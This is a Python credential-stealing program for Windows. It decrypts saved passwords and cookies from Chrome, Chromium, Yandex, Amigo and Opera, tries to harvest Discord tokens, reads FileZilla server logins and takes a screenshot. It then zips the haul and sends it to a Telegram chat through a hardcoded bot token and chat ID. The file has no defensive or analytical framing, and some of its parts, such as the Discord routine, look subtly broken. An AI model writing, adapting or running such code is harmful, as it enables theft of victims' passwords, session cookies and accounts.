import os
import sqlite3
import win32crypt
import telebot
import shutil
import zipfile
import xml.etree.ElementTree as ET
import base64
from PIL import ImageGrab
from datetime import datetime
import json
import glob

username = os.getlogin()
TOKEN = "8493161131:AAFryqnX9b3Vpv2KcrVBsbOUF2fJ9xTapS0"  # Replace with real token from BotFather
CHAT_ID = "-4845037610"
bot = telebot.TeleBot(TOKEN)
DATA_DIR = os.path.join(os.getenv("APPDATA"), "BotData")
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

def connect_to_db(src_path, dst_path):
    try:
        if os.path.exists(src_path):
            shutil.copy2(src_path, dst_path)
            conn = sqlite3.connect(dst_path)
            return conn
        return None
    except Exception as e:
        print(f"Error connecting to database {src_path}: {str(e)}")
        return None

def write_to_file(filename, content):
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(content)
    except Exception as e:
        print(f"Error writing to file {filename}: {str(e)}")

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]  # Remove 'DPAPI' prefix
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"Error retrieving encryption key: {str(e)}")
        return None

def Chrome():
    text = "Passwords Chrome:\nURL | LOGIN | PASSWORD:\n"
    db_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
    db_copy = os.path.join(DATA_DIR, "Login Data2")
    conn = connect_to_db(db_path, db_copy)
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for result in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
                    login, url = result[1], result[0]
                    if password:
                        text += f"{url} | {login} | {password}\n"
                except Exception as e:
                    print(f"Error decrypting Chrome password: {str(e)}")
            conn.close()
        except Exception as e:
            print(f"Error reading Chrome database: {str(e)}")
    write_to_file(os.path.join(DATA_DIR, "google_pass.txt"), text)
    return text

def Chrome_cockie():
    text = "Cookies Chrome:\nURL | COOKIE | COOKIE NAME\n"
    db_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    db_copy = os.path.join(DATA_DIR, "Cookies2")
    conn = connect_to_db(db_path, db_copy)
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for result in cursor.fetchall():
                try:
                    cookie = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
                    name, url = result[1], result[0]
                    text += f"{url} | {cookie} | {name}\n"
                except Exception as e:
                    print(f"Error decrypting Chrome cookie: {str(e)}")
            conn.close()
        except Exception as e:
            print(f"Error reading Chrome cookies: {str(e)}")
    write_to_file(os.path.join(DATA_DIR, "google_cookies.txt"), text)
    return text

def Yandex():
    text = "YANDEX Cookies:\nURL | COOKIE | COOKIE NAME\n"
    db_path = os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default", "Network", "Cookies")
    db_copy = os.path.join(DATA_DIR, "Yandex_Cookies2")
    conn = connect_to_db(db_path, db_copy)
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for result in cursor.fetchall():
                try:
                    cookie = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
                    name, url = result[1], result[0]
                    text += f"{url} | {cookie} | {name}\n"
                except Exception as e:
                    print(f"Error decrypting Yandex cookie: {str(e)}")
            conn.close()
        except Exception as e:
            print(f"Error reading Yandex cookies: {str(e)}")
    write_to_file(os.path.join(DATA_DIR, "yandex_cookies.txt"), text)
    return text

def chromium():
    text = "Chromium Passwords:\nURL | LOGIN | PASSWORD\n"
    db_path = os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default", "Login Data")
    db_copy = os.path.join(DATA_DIR, "Chromium_Login Data2")
    conn = connect_to_db(db_path, db_copy)
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for result in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
                    login, url = result[1], result[0]
                    if password:
                        text += f"{url} | {login} | {password}\n"
                except Exception as e:
                    print(f"Error decrypting Chromium password: {str(e)}")
            conn.close()
        except Exception as e:
            print(f"Error reading Chromium database: {str(e)}")
    write_to_file(os.path.join(DATA_DIR, "chromium.txt"), text)
    return text

def chromiumc():
    text = "Chromium Cookies:\nURL | COOKIE | COOKIE NAME\n"
    db_path = os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default", "Network", "Cookies")
    db_copy = os.path.join(DATA_DIR, "Chromium_Cookies2")
    conn = connect_to_db(db_path, db_copy)
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for result in cursor.fetchall():
                try:
                    cookie = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
                    name, url = result[1], result[0]
                    text += f"{url} | {cookie} | {name}\n"
                except Exception as e:
                    print(f"Error decrypting Chromium cookie: {str(e)}")
            conn.close()
        except Exception as e:
            print(f"Error reading Chromium cookies: {str(e)}")
    write_to_file(os.path.join(DATA_DIR, "chromium_cookies.txt"), text)
    return text

def Amigo():
    text = "Passwords Amigo:\nURL | LOGIN | PASSWORD\n"
    db_path = os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data", "Default", "Login Data")
    db_copy = os.path.join(DATA_DIR, "Amigo_Login Data2")
    conn = connect_to_db(db_path, db_copy)
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for result in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
                    login, url = result[1], result[0]
                    if password:
                        text += f"{url} | {login} | {password}\n"
                except Exception as e:
                    print(f"Error decrypting Amigo password: {str(e)}")
            conn.close()
        except Exception as e:
            print(f"Error reading Amigo database: {str(e)}")
    write_to_file(os.path.join(DATA_DIR, "amigo_pass.txt"), text)
    return text

def Amigo_c():
    text = "Cookies Amigo:\nURL | COOKIE | COOKIE NAME\n"
    db_path = os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data", "Default", "Network", "Cookies")
    db_copy = os.path.join(DATA_DIR, "Amigo_Cookies2")
    conn = connect_to_db(db_path, db_copy)
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for result in cursor.fetchall():
                try:
                    cookie = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
                    name, url = result[1], result[0]
                    text += f"{url} | {cookie} | {name}\n"
                except Exception as e:
                    print(f"Error decrypting Amigo cookie: {str(e)}")
            conn.close()
        except Exception as e:
            print(f"Error reading Amigo cookies: {str(e)}")
    write_to_file(os.path.join(DATA_DIR, "amigo_cookies.txt"), text)
    return text

def Opera():
    text = "Passwords Opera:\nURL | LOGIN | PASSWORD\n"
    db_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")
    db_copy = os.path.join(DATA_DIR, "Opera_Login Data2")
    conn = connect_to_db(db_path, db_copy)
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for result in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
                    login, url = result[1], result[0]
                    if password:
                        text += f"{url} | {login} | {password}\n"
                except Exception as e:
                    print(f"Error decrypting Opera password: {str(e)}")
            conn.close()
        except Exception as e:
            print(f"Error reading Opera database: {str(e)}")
    write_to_file(os.path.join(DATA_DIR, "opera_pass.txt"), text)
    return text

def Opera_c():
    text = "Cookies Opera:\nURL | COOKIE | COOKIE NAME\n"
    db_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Network", "Cookies")
    db_copy = os.path.join(DATA_DIR, "Opera_Cookies2")
    conn = connect_to_db(db_path, db_copy)
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for result in cursor.fetchall():
                try:
                    cookie = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
                    name, url = result[1], result[0]
                    text += f"{url} | {cookie} | {name}\n"
                except Exception as e:
                    print(f"Error decrypting Opera cookie: {str(e)}")
            conn.close()
        except Exception as e:
            print(f"Error reading Opera cookies: {str(e)}")
    write_to_file(os.path.join(DATA_DIR, "opera_cookies.txt"), text)
    return text

def discord_token():
    db_path_pattern = os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb", "*.ldb")
    tokens = []
    try:
        for db_path in glob.glob(db_path_pattern):
            try:
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT key, value FROM ItemTable WHERE key LIKE '%token%'")
                for row in cursor.fetchall():
                    token = row[1].decode("utf-16", errors="ignore")
                    if token:
                        tokens.append(token)
                conn.close()
            except Exception as e:
                print(f"Error reading Discord database {db_path}: {str(e)}")
        if tokens:
            return f"Discord tokens:\n{'\n'.join(tokens)}\n"
        return "Discord exists, but no tokens found"
    except Exception as e:
        print(f"Error retrieving Discord token: {str(e)}")
        return f"Error: {str(e)}"
    finally:
        write_to_file(os.path.join(DATA_DIR, "discord_token.txt"), "\n".join(tokens) if tokens else "No tokens found")

def filezilla():
    try:
        xml_path = os.path.join(os.getenv("APPDATA"), "FileZilla", "recentservers.xml")
        if os.path.isfile(xml_path):
            root = ET.parse(xml_path).getroot()
            data = "FileZilla:\n"
            for server in root.findall(".//Server"):
                host = server.find("Host").text if server.find("Host") is not None else "N/A"
                port = server.find("Port").text if server.find("Port") is not None else "N/A"
                user = server.find("User").text if server.find("User") is not None else "N/A"
                password = base64.b64decode(server.find("Pass").text).decode('utf-8', errors='ignore') if server.find("Pass") is not None else "N/A"
                data += f"host: {host} | port: {port} | user: {user} | pass: {password}\n"
            write_to_file(os.path.join(DATA_DIR, "filezilla.txt"), data)
            return data
        return "Not found"
    except Exception as e:
        print(f"Error reading FileZilla: {str(e)}")
        return f"Error: {str(e)}"

def take_screenshot():
    try:
        screenshot_path = os.path.join(DATA_DIR, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        screen = ImageGrab.grab()
        screen.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"Error taking screenshot: {str(e)}")
        return None

def create_zip(screenshot_path):
    zip_path = os.path.join(DATA_DIR, "LOG.zip")
    files_to_zip = [
        "google_pass.txt", "google_cookies.txt", "yandex_cookies.txt",
        "chromium.txt", "chromium_cookies.txt", "amigo_pass.txt",
        "amigo_cookies.txt", "opera_pass.txt", "opera_cookies.txt",
        "discord_token.txt", "filezilla.txt"
    ]
    if screenshot_path:
        files_to_zip.append(os.path.basename(screenshot_path))
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as newzip:
            for file in files_to_zip:
                file_path = os.path.join(DATA_DIR, file)
                if os.path.exists(file_path):
                    newzip.write(file_path, file)
        return zip_path
    except Exception as e:
        print(f"Error creating ZIP: {str(e)}")
        return None

def main():
    Chrome()
    Chrome_cockie()
    Yandex()
    chromium()
    chromiumc()
    Amigo()
    Amigo_c()
    Opera()
    Opera_c()
    discord_token()
    filezilla()
    screenshot_path = take_screenshot()
    
    zip_path = create_zip(screenshot_path)
    if zip_path:
        try:
            with open(zip_path, 'rb') as log_file:
                bot.send_document(CHAT_ID, log_file)
            print("ZIP sent to Telegram")
        except Exception as e:
            print(f"Error sending ZIP: {str(e)}")
        finally:
            if os.path.exists(zip_path):
                os.remove(zip_path)

if __name__ == "__main__":
    main()